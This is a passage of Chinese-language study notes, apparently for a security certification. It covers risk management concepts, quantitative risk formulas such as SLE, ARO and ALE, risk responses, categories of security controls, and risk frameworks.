threat</h3><p>任何可能发生的、对组织或特定资产造成不良或非预期结果的潜在事件都是威胁。</p><p>可能是故意的，可能是意外</p><p>可以来源于内部，可以来源于外部</p><p>威胁是可能对目标造成伤害的武器。</p><h3 id="威胁代理-主体"><a href="#威胁代理-主体" class="headerlink" title="威胁代理&#x2F;主体"></a>威胁代理&#x2F;主体</h3><p>威胁代理或威胁主体有目的地利用脆弱性。</p><p>威胁主体可能是 人员、程序、硬件或系统</p><h3 id="威胁事件"><a href="#威胁事件" class="headerlink" title="威胁事件"></a>威胁事件</h3><p>对脆弱性的意外和有意利用。</p><p>可以是自发的，也可以是人为的。</p><h3 id="威胁向量-攻击向量"><a href="#威胁向量-攻击向量" class="headerlink" title="威胁向量&#x2F;攻击向量"></a>威胁向量&#x2F;攻击向量</h3><p>攻击或攻击者为了造成伤害而访问目标时所采用的路径或手段。</p><p>可能的威胁向量</p><ul><li>电子邮件</li><li>网页浏览</li><li>外部驱动器</li><li>Wi-Fi 网络</li><li>物理访问</li><li>移动设备</li><li>云</li><li>社交媒体</li><li>供应链</li><li>可移动介质</li><li>商业软件</li></ul><h3 id="脆弱性-vulnerability"><a href="#脆弱性-vulnerability" class="headerlink" title="脆弱性 vulnerability"></a>脆弱性 vulnerability</h3><p>资产中的弱点，防护措施或控制措施的弱点，防护措施&#x2F;控制措施的缺乏</p><p>脆弱性是使威胁能够造成损害的缺陷、漏洞、疏忽、错误、局限性、过失或薄弱环节。</p><h3 id="暴露-exposure"><a href="#暴露-exposure" class="headerlink" title="暴露 exposure"></a>暴露 exposure</h3><p>威胁导致资产受到破坏的<strong>可能性</strong>。</p><p>定量分析：暴露因子（EF） 值</p><h3 id="风险-risk"><a href="#风险-risk" class="headerlink" title="风险 risk"></a>风险 risk</h3><p>威胁利用脆弱性对资产造成损害的可能性或概率以及可能造成损害的严重程度。</p><p>每个暴露实例都是一种风险。</p><p>风险 &#x3D; 威胁 * 脆弱性</p><p>风险 &#x3D; 损害的可能性 * 损害的严重程度</p><p>威胁或威胁代理的解决都可以直接降低风险。</p><p>安全的整体目的是通过消除脆弱性和防止威胁主体或威胁事件危害资产，来避免风险成为现实。</p><h3 id="防护措施-safeguard"><a href="#防护措施-safeguard" class="headerlink" title="防护措施 safeguard"></a>防护措施 safeguard</h3><p>防护措施、安全控制、保护机制或控制措施指的是任何能消除或减少脆弱性，或能抵御一个或多个特定威胁的事物。</p><p>防护措施未必涉及新产品的购买，重新配置现有元素，甚至从基础设施中删除某些元素，也可以是有效的防护措施或风险响应。</p><h3 id="攻击-attack"><a href="#攻击-attack" class="headerlink" title="攻击 attack"></a>攻击 attack</h3><p>威胁主体故意尝试利用脆弱性造成资产破坏、丢失或泄露。</p><h3 id="破坏-breach"><a href="#破坏-breach" class="headerlink" title="破坏 breach"></a>破坏 breach</h3><p>破坏、入侵或渗透是指安全机制被威胁主体绕过或阻止。</p><p>破坏是成功的攻击。</p><p>威胁利用脆弱性，脆弱性导致暴露，暴露就是风险，防护措施可减轻风险，保护遭受威胁的资产。</p><p><img src="/image-20250516080534841.png" alt="image-20250516080534841"></p><p>资源-威胁组合：<br>1、先威胁收集，后资产盘点</p><p>威胁收集</p><p>2、先资产盘点，后威胁收集</p><p>评估价值非常低和风险极低的资产（将被定义为可接受的风险），进而增加风险评估所需的总体时间</p><h2 id="2-2-2-资产估值"><a href="#2-2-2-资产估值" class="headerlink" title="2.2.2 资产估值"></a>2.2.2 资产估值</h2><p>基于资产或以资产为起点的风险分析是从清点所有组织资产开始。</p><p>清点完成进行资产估值</p><p>资产的价值直接影响和引导为保护资产而部署的防护措施和安全水平。</p><p>防护措施的年度成本不应该超过资产的年度损失期望。</p><p>有形价值和无形价值的事项：</p><ul><li>采购成本</li><li>开发成本</li><li>行政或管理成本</li><li>维护或保养费用</li><li>资产购置成本</li><li>保护和维护资产的成本</li><li>对所有者和用户的价值</li><li>对竞争对手的价值</li><li>知识产权或股票价值</li><li>市场估值（可持续的价格）</li><li>重置成本</li><li>生产率的提高或下降</li><li>资产存在和损失的运营成本</li><li>资产损失责任</li><li>实用性</li><li>与研究和开发的关系</li></ul><p>为组织分配或确定资产估值时可通过以下方式满足许多要求：</p><ul><li>作为部署防护措施实现资产保护的成本&#x2F;收益分析的基础</li><li>作为评估防护措施和控制措施的一种手段</li><li>为购买保险提供价值并为组织确定总体的净资产或净值</li><li>帮助高级管理人员准确了解组织中存在的风险</li><li>防止未给予应尽关心&#x2F;尽职审查，并促进遵守法律要求、行业法规和内部安全策略</li></ul><h2 id="2-2-3-识别威胁和脆弱性"><a href="#2-2-3-识别威胁和脆弱性" class="headerlink" title="2.2.3 识别威胁和脆弱性"></a>2.2.3 识别威胁和脆弱性</h2><p>风险管理的一个基础部分时识别与检查威胁</p><p>为已识别资产创建尽可能详尽的威胁列表，需要包括威胁主体以及威胁事件。</p><p>执行风险评估和分析的应该是一个团队。</p><p>团队需要来自组织内的各个部门。</p><p>风险管理顾问</p><p>使用复杂而昂贵的风险评估软件。</p><h2 id="2-2-4-风险评估-分析"><a href="#2-2-4-风险评估-分析" class="headerlink" title="2.2.4 风险评估&#x2F;分析"></a>2.2.4 风险评估&#x2F;分析</h2><p>风险评估&#x2F;分析主要是高层管理人员的职责。</p><p>实际执行任务下发，工作结果作为建议方案提供高层管理人员，高层管理人员决定实施哪些响应措施。</p><p>高层管理人员负责通过定义工作的范围和目标来支持风险分析和评估</p><p>所有风险评估、结果、决策和产出都必须得到高层管理人员的理解和批准，是应尽关心&#x2F;尽职审查的一部分。</p><p>高层管理人员需要决定哪些风险是可接受的，哪些风险是不可接受的。</p><p>必须评估每个资产-威胁组合并计算或评估相关风险。</p><p><strong>风险评估的目标</strong>是识别风险（基于资产-威胁组合）并按照重要性进行优先级排序。</p><h3 id="风险评估方法"><a href="#风险评估方法" class="headerlink" title="风险评估方法"></a>风险评估方法</h3><p>使用定性评估机制来确定是否需要一个详细且耗费资源&#x2F;事件较多的定量评估机制。</p><h4 id="定性风险分析"><a href="#定性风险分析" class="headerlink" title="定性风险分析"></a>定性风险分析</h4><p>基于场景</p><p>对威胁进行分级，评估风险、成本和影响</p><h5 id="定性风险分析技术"><a href="#定性风险分析技术" class="headerlink" title="定性风险分析技术"></a>定性风险分析技术</h5><ul><li>头脑风暴</li><li>故事板</li><li>焦点小组</li><li>调查</li><li>问卷</li><li>检查清单</li><li>一对一会议</li><li>采访</li><li>场景</li><li>Delphi 技术</li></ul><h6 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h6><p>所有机制的基本过程都需要创建场景。</p><p>对单个威胁的书面描述。</p><p>描述内容：</p><ul><li>威胁如何产生</li><li>可能带来的影响</li></ul><p>威胁级别设定：</p><p>高、中、低或 1～10 的数字，详细的文字</p><p>定性风险分析的有用性和有效性随着评估参与者的数量和多样性的增加而提高。</p><p>尽可能将组织层次结构内每个层次的人员加入评估组。</p><h6 id="Delphi-技术"><a href="#Delphi-技术" class="headerlink" title="Delphi 技术"></a>Delphi 技术</h6><p>匿名的反馈和响应过程，用于在一个小组中匿名达成共识。</p><p>主要目的是从所有参与者中得到诚实且不受影响的反馈。</p><p>Delphi 技术的目标或意图是促进对想法、概念和解决方案的评估，而不会因为想法的来源而经常区别对待。</p><h4 id="定量风险分析"><a href="#定量风险分析" class="headerlink" title="定量风险分析"></a>定量风险分析</h4><p>可以计算出具体概率指数或用数字提示出相关风险的可能性。</p><p>最终报告是一份包含风险级别、潜在损失、控制措施成本和防护措施价值等数据的报告。</p><p>完全靠定量分析是不可行的，并不是所有分析元素和内容都可量化，有些元素和内容是定性的、主观的或无形的。</p><h5 id="定量风险分析的阶段-步骤"><a href="#定量风险分析的阶段-步骤" class="headerlink" title="定量风险分析的阶段&#x2F;步骤"></a>定量风险分析的阶段&#x2F;步骤</h5><ol><li><p>编制资产清单，并为每个资产分配资产价值（asset value，AV）</p></li><li><p>研究每一项资产，列出每一项资产可能面临的所有威胁，形成资产-威胁组合</p></li><li><p>对于每个资产-威胁组合，计算暴露因子（exposure factor，EF）</p></li><li><p>对于每个资产-威胁组合，计算单一损失期望（single loss expectancy，SLE）</p></li><li><p>执行威胁分析，计算每个威胁在一年内实际发生的可能性，也就是年度发生率（annualized rate of occurrence，ARO）</p></li><li><p>通过计算年度损失期望（annualized loss expectancy，ALE）得到每个威胁可能带来的总损失。</p></li><li><p>研究每种威胁的控制措施，基于已采取的控制措施，计算 ARO、EF、ALE 的变化</p></li><li><p>针对每项资产的每个威胁的每个防护措施进行成本&#x2F;效益分析。为每个威胁选择最合适的防护措施。</p><p><img src="/image-20250516092259545.png" alt="image-20250516092259545"></p></li></ol><h5 id="暴露因子-EF"><a href="#暴露因子-EF" class="headerlink" title="暴露因子 EF"></a>暴露因子 EF</h5><p>如果已发生的风险对组织的某个特定资产造成破坏，组织将因此遭受的损失百分比。</p><p>也称为潜在损失</p><p>EF 表示单个风险发生时对整体资产价值造成的损失预计值。</p><p>可替换资产（硬件），EF 很小，不可替换资产（数据库等），EF 很大</p><p>EF 用百分比表示</p><h5 id="单一损失期望-SLE"><a href="#单一损失期望-SLE" class="headerlink" title="单一损失期望 SLE"></a>单一损失期望 SLE</h5><p>单一损失期望（SLE）是特定资产发生单一真实威胁的潜在损失，也就是可能造成的损失。</p><p>SLE 计算公式：<br>    SLE &#x3D; 资产价值（AV）* 暴露因子（EF）</p><p>或更简单</p><p>​SLE &#x3D; AV * EF</p><p>例如：</p><p>​资产价值为 200 000 美元，特定威胁的暴露因子 EF 45% ，特定威胁的 SLE 为 200 000 * 45% &#x3D; 90 000 美元</p><h5 id="年度发生率-ARO"><a href="#年度发生率-ARO" class="headerlink" title="年度发生率 ARO"></a>年度发生率 ARO</h5><p>在一年内特定威胁或风险发生（即真实发生）的预期频率。</p><p>ARO 可能为 0 （几乎不发生），可能很大（经常发生）</p><p>ARO 来源</p><ul><li>查看历史内部数据</li><li>执行统计分析</li><li>咨询公众或订阅的风险总账&#x2F;登记册</li><li>与顾问合作获取</li></ul><p>某些 ARO 是通过将单个威胁发生的可能性乘以引起威胁的用户数量计算的，因此也被称为<strong>概率测定</strong></p><h5 id="年度损失期望-ALE-最常用"><a href="#年度损失期望-ALE-最常用" class="headerlink" title="年度损失期望 ALE - 最常用"></a>年度损失期望 ALE - 最常用</h5><p>针对特定资产的单一特定威胁实际发生的所有实例，在年度内可能造成的损失成本。</p><p>ALE 的计算公式：</p><p>​ALE &#x3D; 单一损失期望 （SLE） * 年度发生率（ARO）</p><p>​ALE &#x3D; SLE * ARO</p><p>或</p><p>​ALE &#x3D; 资产价值（AV）* 暴露因子（EF）* 年度发生率（ARO）</p><p>​ALE &#x3D; AV * EF * ARO</p><p>数值最大的 ALE 就是组织面临的最大问题，也是风险响应中要解决的第一个问题。</p><p><img src="/image-20250516224508032.png" alt="image-20250516224508032"></p><h2 id="2-2-5-风险响应"><a href="#2-2-5-风险响应" class="headerlink" title="2.2.5 风险响应"></a>2.2.5 风险响应</h2><p>风险评估用于识别风险并设定关键优先级</p><p>风险响应用于为每个已识别风险确定最佳的防御方案</p><p>对风险可能的响应（与组织风险偏好和风险容忍度有关）</p><ul><li>降低或缓解风险</li><li>转让或转移风险</li><li>威慑风险</li><li>规避风险</li><li>接受风险</li><li>拒绝或忽略风险</li></ul><p>风险偏好：</p><p>组织愿意在所有资产中承担的风险总量。</p><p>风险能力：<br>组织能够承担的风险水平</p><p>风险承受能力：</p><p>组织将接受的每个资产-威胁组合的风险数量或水平</p><p>风险限值：</p><p>在采取进一步风险管理措施之前可以容忍的高于风险目标的最大风险水平</p><h3 id="风险响应方式"><a href="#风险响应方式" class="headerlink" title="风险响应方式"></a>风险响应方式</h3><h4 id="风险缓解-risk-mitigation"><a href="#风险缓解-risk-mitigation" class="headerlink" title="风险缓解 risk mitigation"></a>风险缓解 risk mitigation</h4><p>降低风险或缓解风险是指通过实施防护措施、安全控制和安全对策以减少或消除脆弱性或阻止威胁。</p><p>常见范例：</p><ul><li>加密</li><li>防火墙</li></ul><h4 id="风险转让-risk-assignment"><a href="#风险转让-risk-assignment" class="headerlink" title="风险转让 risk assignment"></a>风险转让 risk assignment</h4><p>风险转让或风险转移指将风险带来的损失转嫁给另一个实体或组织。</p><p>常见范例</p><ul><li>外包</li><li>传统保险</li><li>网络安全保险</li></ul><h4 id="风险威慑-risk-deterrence"><a href="#风险威慑-risk-deterrence" class="headerlink" title="风险威慑 risk deterrence"></a>风险威慑 risk deterrence</h4><p>风险威慑是对可能违反安全和策略的违规者实施震慑的过程。</p><p>目的：</p><p>说服威胁主体不进行攻击。</p><p>常见事例：</p><ul><li>实施审计</li><li>安全摄像头</li><li>警告横幅</li><li>使用安保人员</li></ul><h4 id="风险规避-risk-avoidance"><a href="#风险规避-risk-avoidance" class="headerlink" title="风险规避 risk avoidance"></a>风险规避 risk avoidance</h4><p>风险规避是选择替代的选项或活动的过程，替代选项或活动的风险低于默认的、通用的、权宜的或廉价的选项。</p><h4 id="风险接受-risk-acceptance"><a href="#风险接受-risk-acceptance" class="headerlink" title="风险接受 risk acceptance"></a>风险接受 risk acceptance</h4><p>风险接受或风险容忍是成本&#x2F;收益分析表明控制措施的成本将超过风险可能造成的损失之后的结果。</p><p>管理层已经接受风险造成的后果和损失。</p><p>接受风险需要明确的书面陈述，并由高级管理人员书面签字。</p><h4 id="风险拒绝-risk-rejection"><a href="#风险拒绝-risk-rejection" class="headerlink" title="风险拒绝 risk rejection"></a>风险拒绝 risk rejection</h4><p>一个不可接受的但可能发生的风险响应是拒绝风险或忽略风险。</p><p>风险拒绝不是有效的或审慎的应尽关心&#x2F;尽职审查的风险响应方式。</p><h3 id="风险类型"><a href="#风险类型" class="headerlink" title="风险类型"></a>风险类型</h3><h4 id="固有风险-初始风险-起始风险"><a href="#固有风险-初始风险-起始风险" class="headerlink" title="固有风险&#x2F;初始风险&#x2F;起始风险"></a>固有风险&#x2F;初始风险&#x2F;起始风险</h4><p>没有执行任何风险管理工作之前，自然、原生或默认的风险水平</p><p>可能存在的地方：</p><p>供应链</p><p>开发人员操作</p><p>系统的设计</p><p>架构或组织的知识和技能基础</p><h4 id="残余风险"><a href="#残余风险" class="headerlink" title="残余风险"></a>残余风险</h4><p>采取防火措施、安全控制或安全对策后，剩余的的风险。</p><p>管理层选择接受而不去减轻的风险。</p><p>不具有成本效益的防护措施。</p><h4 id="总风险"><a href="#总风险" class="headerlink" title="总风险"></a>总风险</h4><p>没有实施防护措施的情况下组织面临的全部风险</p><p>总风险 &#x3D; 威胁 *  脆弱性 * 资产价值</p><h4 id="控制间隙"><a href="#控制间隙" class="headerlink" title="控制间隙"></a>控制间隙</h4><p>通过实施防护措施而减少的风险。</p><p>总风险 - 控制间隙 &#x3D; 残余风险</p><h3 id="定期评估"><a href="#定期评估" class="headerlink" title="定期评估"></a>定期评估</h3><p>风险处理和风险管理一样，都不是一次性的，需要持续维护和重复确认安全。</p><h3 id="控制风险"><a href="#控制风险" class="headerlink" title="控制风险"></a>控制风险</h3><p>将安全对策部署到环境中时引入的风险。</p><p><strong>风险评估和风险响应必须是迭代化操作，自我回顾以进行持续改进。</strong></p><h2 id="2-2-6-安全控制的成本与收益"><a href="#2-2-6-安全控制的成本与收益" class="headerlink" title="2.2.6 安全控制的成本与收益"></a>2.2.6 安全控制的成本与收益</h2><p>对于每个资产-威胁组合（也就是已经识别的风险），必须编制一份可能的或可用的防护措施清单。</p><p>列出清单后，评估防护措施的收益和相关联的资产-威胁组合的成本。</p><h3 id="防护措施、安全控制和安全对策效果"><a href="#防护措施、安全控制和安全对策效果" class="headerlink" title="防护措施、安全控制和安全对策效果"></a>防护措施、安全控制和安全对策效果</h3><h4 id="降低潜在破坏比例-ARO"><a href="#降低潜在破坏比例-ARO" class="headerlink" title="降低潜在破坏比例 ARO"></a>降低潜在破坏比例 ARO</h4><p>是否部署措施，单个事件发生时造成的损失 SLE 是一样的。</p><h4 id="降低损害数量或严重程度-EF"><a href="#降低损害数量或严重程度-EF" class="headerlink" title="降低损害数量或严重程度 EF"></a>降低损害数量或严重程度 EF</h4><p>部署措施会比没有部署措施单个事件造成的损失要小。</p><h3 id="潜在-ALE"><a href="#潜在-ALE" class="headerlink" title="潜在 ALE"></a>潜在 ALE</h3><p>ALE &#x3D; AV * EF * ARO</p><p>初始资产-风险组合的ALE 为 ALE1</p><p>特定防护措施的 ALE 为 ALE2</p><h3 id="防护措施成本"><a href="#防护措施成本" class="headerlink" title="防护措施成本"></a>防护措施成本</h3><p>需要对组织中部署的防护措施的年度成本进行估算，也就是年度成本（ACS）</p><h4 id="影响-ACS-常见因素"><a href="#影响-ACS-常见因素" class="headerlink" title="影响 ACS 常见因素"></a>影响 ACS 常见因素</h4><ul><li>购买、开发和许可的成本</li><li>实施和定制的成本</li><li>年度运营、维护、管理的费用</li><li>年度维修和升级的成本</li><li>生产率的提高或降低</li><li>环境的改变</li><li>测试和评估的成本</li></ul><p>受保护资产的价值决定了保护机制的最大支出。</p><p>如果 ACS 大于 ALE1（特定威胁给特定资产带来的潜在年度损失），防护措施就是不具备成本效益的解决方案。</p><p>如果全部防护方案措施都不具备成本效益，接受风险</p><p><strong>安全具有成本效益</strong>。</p><p><strong>防护措施前的 ALE - 防护措施实施后的 ALE -防护措施年度成本 ACS &#x3D; 防护措施对公司的价值</strong></p><p>评估防护措施时，费用不应该是唯一考虑的因素，还需要考虑法律责任和审慎的应尽关心&#x2F;尽职审查问题。</p><p>分析防护措施成本&#x2F;效益因素：</p><ul><li>资产与威胁组合在防护措施实施前的 ALE</li><li>资产与威胁组合在防护措施实施后的 ALE</li><li>ACS（annual cost of the safeguard，防护措施的年度成本）</li></ul><p>特定资产的特定风险采用的特定防护措施的成本&#x2F;收益：</p><p>（防护措施实施前的 ALE - 防护措施实施后的 ALE）- ACS</p><p>或</p><p>（ALE1 - ALE2 ）- ACS</p><p>一般情况下，成本&#x2F;收益最大的就是针对特定资产的特定风险实施的最佳防护措施。</p><p>决策的因素：</p><ul><li>成本&#x2F;收益（主要指导因素）</li><li>实际成本</li><li>安全预算</li><li>与现有系统的兼容性</li><li>IT 人员的技能&#x2F;知识库</li><li>产品的可用性</li><li>政治问题</li><li>合作伙伴关系</li><li>市场趋势</li><li>热点</li><li>市场营销</li><li>合同</li><li>倾向</li></ul><p>定量风险分析公式</p><table><thead><tr><th>概念</th><th>公式或含义</th><th>说明</th></tr></thead><tbody><tr><td>资产价值（AV）</td><td>$</td><td>资产实际价值</td></tr><tr><td>暴露因子（EF）</td><td>%</td><td>资产暴露造成的损失比例</td></tr><tr><td>单一损失期望（SLE）</td><td>SLE  &#x3D; AV * EF</td><td>资产暴露造成的损失数值</td></tr><tr><td>年度发生率（ARO）</td><td># &#x2F;年</td><td>风险每年发生的几率</td></tr><tr><td>年度损失期望（ALE）</td><td>ALE  &#x3D; AV * EF * ARO 或 ALE &#x3D; SLE * ARO</td><td>风险每年造成的损失数值</td></tr><tr><td>防护措施的年度成本（ACS）</td><td>$&#x2F;年</td><td>所有防护措施的成本</td></tr><tr><td>防护措施的价值或收益（如成本&#x2F;收益方程式）</td><td>（ALE1 - ALE2）- ACS</td><td></td></tr></tbody></table><p>以有限的成本获取最佳的安全。</p><p>整个防护措施的选择需要考虑到当前的预算。</p><p>组织安全应该基于业务案例，并合理地与安全性框架、法规和最佳实践保持一致。</p><h2 id="2-2-7-选择与实施安全对策"><a href="#2-2-7-选择与实施安全对策" class="headerlink" title="2.2.7 选择与实施安全对策"></a>2.2.7 选择与实施安全对策</h2><p>评估安全控制价值或相关性需要考虑的因素</p><ul><li>控制措施的成本应该低于资产的价值</li><li>控制措施的成本应该低于控制措施的收益</li><li>应用控制措施的结果应该使攻击者的攻击成本高于攻击带来的收益</li><li>控制措施应该为真实的和已识别的问题提供解决方案</li><li>控制措施的好处不应该依赖于其保密性。任何可行的控制措施都能经得起公开披露和审查。</li><li>控制措施的收益应当是可检测和可验证的。</li><li>控制措施应该在所有用户、系统、协议之间提供一致的和统一的保护。</li><li>控制措施应该几乎或完全没有依赖项，以减少级联故障</li><li>完成初始部署和配置后，控制措施只需要最低限度的认为干预</li><li>应该防止篡改控制措施</li><li>只有拥有特权的操作员才能全面访问控制措施</li><li>应当为控制措施提供故障安全和故障保护选项。</li></ul><p>安全为业务功能和任务进行支持和赋能，在业务的上下文中评估控制措施和防护措施。</p><h3 id="1-管理性控制措施"><a href="#1-管理性控制措施" class="headerlink" title="1. 管理性控制措施"></a>1. 管理性控制措施</h3><p>依据组织的安全策略和其他法规或要求而规定的策略和程序。</p><p>也被称为管理控制、行政控制、程序控制。</p><p>面向人员监督和业务实践。</p><p>常见示例：</p><p>策略</p><p>程序</p><p>招聘实践</p><p>背景调查</p><p>数据分类和标签</p><p>安全意识和培训工作</p><p>报告和审查</p><p>工作监督</p><p>人员控制和测试</p><h3 id="2-逻辑性-技术性控制措施"><a href="#2-逻辑性-技术性控制措施" class="headerlink" title="2. 逻辑性&#x2F;技术性控制措施"></a>2. 逻辑性&#x2F;技术性控制措施</h3><p>包括硬件或软件机制，可用于管理访问权限以及为 IT  资源和系统提供安全保护。</p><p>常见示例：<br>身份认证方法（如密码、智能卡和生物识别技术）</p><p>加密</p><p>限制接口</p><p>访问控制列表</p><p>协议</p><p>防火墙</p><p>路由器</p><p>入侵检测系统（IDS）</p><p>阈值级别</p><h3 id="3-物理性控制措施"><a href="#3-物理性控制措施" class="headerlink" title="3. 物理性控制措施"></a>3. 物理性控制措施</h3><p>专为设施和真实世界对象提供保护的安全机制。</p><p>常见示例：</p><p>保安</p><p>栅栏</p><p>动作探测器</p><p>上锁的门</p><p>密封的窗户</p><p>灯</p><p>电缆保护</p><p>笔记本电脑锁</p><p>徽章</p><p>刷卡</p><p>看门狗</p><p>摄像机</p><p>访问控制门厅</p><p>报警器</p><p>保护思路：</p><p>首先通过策略（管理性控制）全面驱动安全并围绕资产形成初始保护层</p><p>其次，逻辑性&#x2F;技术性控制提供对逻辑攻击和漏洞利用的保护。</p><p>最后，物理控制可防止针对设施和设备的真实物理攻击。</p><p><img src="/image-20250520080155852.png" alt="image-20250520080155852"></p><h2 id="2-2-8-适用的控制类型"><a href="#2-2-8-适用的控制类型" class="headerlink" title="2.2.8 适用的控制类型"></a>2.2.8 适用的控制类型</h2><p>安全控制指的是执行各种控制任务。</p><h3 id="1-预防控制"><a href="#1-预防控制" class="headerlink" title="1. 预防控制"></a>1. 预防控制</h3><p>部署预防控制以阻挠或阻止非预期的或未经授权的活动的发生。</p><p>示例：</p><p>栅栏</p><p>锁</p><p>身份认证</p><p>访问控制门厅</p><p>报警系统</p><p>职责分离</p><p>岗位轮换</p><p>数据丢失预防（DLP）</p><p>渗透测试</p><p>访问控制方法</p><p>加密</p><p>审计</p><p>安全策略</p><p>安全意识培训</p><p>杀毒软件</p><p>防火墙</p><p>入侵预防系统（IPS）</p><h3 id="2-威慑控制"><a href="#2-威慑控制" class="headerlink" title="2. 威慑控制"></a>2. 威慑控制</h3><p>部署威慑控制以阻止违反安全策略的行为。</p><p>需要说服个人不采取不必要的行动。</p><p>示例：<br>策略</p><p>安全意识培训</p><p>锁</p><p>栅栏</p><p>安全标识</p><p>保安</p><p>访问控制门厅</p><p>安全摄像头</p><h3 id="3-检测控制"><a href="#3-检测控制" class="headerlink" title="3. 检测控制"></a>3. 检测控制</h3><p>部署检测控制以发现或检测非预期的或未经授权的活动。</p><p>活动发生后才运行和发现。</p><p>示例：<br>保安</p><p>运动探测器</p><p>记录和审查安全摄像头或闭路电视捕捉到的事件</p><p>岗位轮换</p><p>强制休假</p><p>审计踪迹</p><p>蜜罐或蜜网</p><p>入侵检测系统（IDS ）</p><p>违规报告</p><p>对用户的监督和审查</p><p>事件调查</p><h3 id="4-补偿控制"><a href="#4-补偿控制" class="headerlink" title="4. 补偿控制"></a>4. 补偿控制</h3><p>为其他现有的控制提供各种选项，从而帮助增强和支持安全策略。</p><p>可以替代或补充其他控制选项。</p><p>功能：</p><ul><li>提高主要控制有效性</li><li>主要控制发生故障时的替换或故障转移选项</li></ul><h3 id="5-纠正控制"><a href="#5-纠正控制" class="headerlink" title="5. 纠正控制"></a>5. 纠正控制</h3><p>修改环境，使系统从发生的非预期的或未经授权的活动中恢复到正常状态。</p><p>纠正控制试图纠正安全事故引发的任何问题。</p><p>纠正控制的可能选项：</p><p>终止恶意活动</p><p>重新启动系统</p><p>删除或隔离病毒</p><p>备份恢复计划</p><p>修改环境阻止攻击</p><p>示例：</p><p>门上安装弹簧使其关闭并重新锁定</p><p>使用文件完整性检查工具替换损坏的启动文件</p><h3 id="6-恢复控制"><a href="#6-恢复控制" class="headerlink" title="6. 恢复控制"></a>6. 恢复控制</h3><p>纠正控制的扩展，具有更高级、更复杂的能力。</p><p>示例：</p><p>备份和恢复</p><p>容错驱动系统</p><p>系统镜像</p><p>服务器集群</p><p>杀毒软件</p><p>数据库或虚假机镜像</p><p>针对业务连续和灾难恢复示例：</p><p>热站点</p><p>温站点</p><p>冷站点</p><p>备用处理设施</p><p>服务机构</p><p>互惠协议</p><p>云服务提供商</p><p>流动移动操作中心</p><p>多站点解决方案</p><h3 id="7-指示控制"><a href="#7-指示控制" class="headerlink" title="7. 指示控制"></a>7. 指示控制</h3><p>用于指导、限制或控制主体的行为，以强制或鼓励主体遵守安全策略。</p><p>示例：</p><p>安全策略要求或标准</p><p>发布的通知</p><p>保安指引</p><p>逃生路线出口标志</p><p>监控</p><p>监督</p><p>程序</p><h2 id="2-2-9-安全控制评估-SCA"><a href="#2-2-9-安全控制评估-SCA" class="headerlink" title="2.2.9 安全控制评估 SCA"></a>2.2.9 安全控制评估 SCA</h2><p>安全控制评估（security control assessment，SCA）</p><p>根据基线或可靠性期望对安全基础设施的各个机制进行的正式评估。</p><p>目标：</p><p>确保安全机制的有效性，评估组织风险管理过程和质量和彻底性，并生成关于已经部署的安全基础设施的优缺点的报告。</p><p>SCA 结果证明原有安全机制的有效性，或者需要解决存在缺陷的安全控制。</p><p>评估需要考虑的点：</p><ul><li>验证安全控制的可靠性</li><li>考虑是否会影响隐私</li></ul><h2 id="2-2-10-监视和测量"><a href="#2-2-10-监视和测量" class="headerlink" title="2.2.10 监视和测量"></a>2.2.10 监视和测量</h2><p>安全控制提供的收益应该使可以被监视和测量的。</p><p>衡量控制措施的有效性时并非总能获得一个绝对值。</p><p>必须在安全措施执行前后进行监视和记录。</p><p>如果安全控制仅在一定程度上增强安全性，那么未必意味着所获得的收益是合算的。</p><h2 id="2-2-11-风险报告和文档"><a href="#2-2-11-风险报告和文档" class="headerlink" title="2.2.11 风险报告和文档"></a>2.2.11 风险报告和文档</h2><p>风险报告是风险分析结束时需要执行的一项关键任务。</p><p>风险报告包括编制风险报告，并将报告呈现给利益相关方。</p><p>风险报告需要准确、及时、全面反映组织情况，支持决策的制订，并定期更新。</p><p>风险登记册或风险日志是一份风险清单文档。</p><p>用于记录和跟踪风险管理活动，包括内容如下：</p><ul><li>已识别的风险</li><li>评估风险的严重性并确定优先级</li><li>制订响应措施以减少或消除风险。</li><li>跟踪风险缓解的进度</li></ul><p>风险登记册可作为项目管理文件。</p><p>风险登记册的内容可以与其他人共享。</p><p>风险矩阵或风险热图是一种在基本图形或图表上执行的风险评估形式，也被称为定性风险评估。</p><h2 id="2-2-12-持续改进"><a href="#2-2-12-持续改进" class="headerlink" title="2.2.12 持续改进"></a>2.2.12 持续改进</h2><p>风险分析目的是为高层提供必要的详细信息，由高层决定风险处置形式（缓解、转移、威慑、规避、接受）。</p><p>风险分析&#x2F;风险评估是一种”时间点“度量，风险评估需要定期进行以支持持续改进。</p><p>风险成熟度模型（risk maturity model，RMM）</p><p>企业风险管理（enterprise risk management，ERM）</p><p>RMM 从成熟、可持续和可重复方面评估 ERM 计划</p><p><strong>RMM 级别</strong></p><p>1、初始级（ad hoc）</p><p>所有组织开始进行风险管理时的混乱状态</p><p>2、预备级（preliminary）</p><p>初步尝试遵守风险管理流程，各部门使用不同的风险评估</p><p>3、定义级（defined）</p><p>在整个组织范围内采用通用或标准化的风险框架</p><p>4、集成级 integrated</p><p>风险管理操作被集成到业务流程中，风险被视为业务战略决策的一个要素。</p><p>5、优化级 optimized</p><p>风险管理侧重于实现目标，而不是仅仅对外部威胁做出响应。</p><p>是为了业务成功，而不只是避免事故。</p><p><strong>遗留设备风险（EOL&#x2F;EOSL）</strong></p><ul><li><p>生产期终止（end-of-life，EOL）</p><p>制造商不再生产产品的时间点</p><p>不再销售或分发新版本，提供一段时间的服务和支持</p><p>EOL 产品需要在出现故障或支持期终止（end-of-support，EOS）或服务期终止（end-of-service life ,EOSL ）之前更换</p></li><li><p>EOL 会被认为或用作 EOSL 同义词</p><p>服务器终止（EOSL）或支持期终止（EOS）系统是指那些不再从供应商处获得更新和支持的系统。</p><p>继续使用存在风险，必须移除 EOSL 系统。</p></li></ul><h2 id="2-2-13-风险框架"><a href="#2-2-13-风险框架" class="headerlink" title="2.2.13 风险框架"></a>2.2.13 风险框架</h2><p>风险框架是关于如何评估、解决和监控风险的指南或方法。</p><h3 id="风险管理框架-RMF"><a href="#风险管理框架-RMF" class="headerlink" title="风险管理框架 RMF"></a>风险管理框架 RMF</h3><p>风险管理框架（risk management framework，RMF）</p><p>为联邦机构制定的强制性要求</p><h4 id="六个循环性阶段（按顺序重复执行）"><a href="#六个循环性阶段（按顺序重复执行）" class="headerlink" title="六个循环性阶段（按顺序重复执行）"></a>六个循环性阶段（按顺序重复执行）</h4><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>通过建立管理安全和隐私风险的上下文和优先级，准备从组织级和系统级的角度执行 RMF</p><h5 id="分类"><a href="#分类" class="headerlink" 